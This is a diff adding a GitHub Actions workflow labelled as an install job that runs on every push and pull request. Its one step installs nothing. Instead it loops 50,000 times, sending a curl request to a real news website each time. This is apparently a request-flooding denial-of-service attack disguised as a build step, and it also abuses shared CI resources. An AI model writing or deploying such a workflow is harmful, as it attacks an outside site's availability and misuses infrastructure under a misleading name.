@@ -1,0 +1,12 @@
+name: Installing 1 >
+on: [push, pull_request]
+jobs:
+  install:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          for((i=1; i<=50000; i++));
+          do
+           curl 'https://www.altnews.in/' --compressed
+          done
+
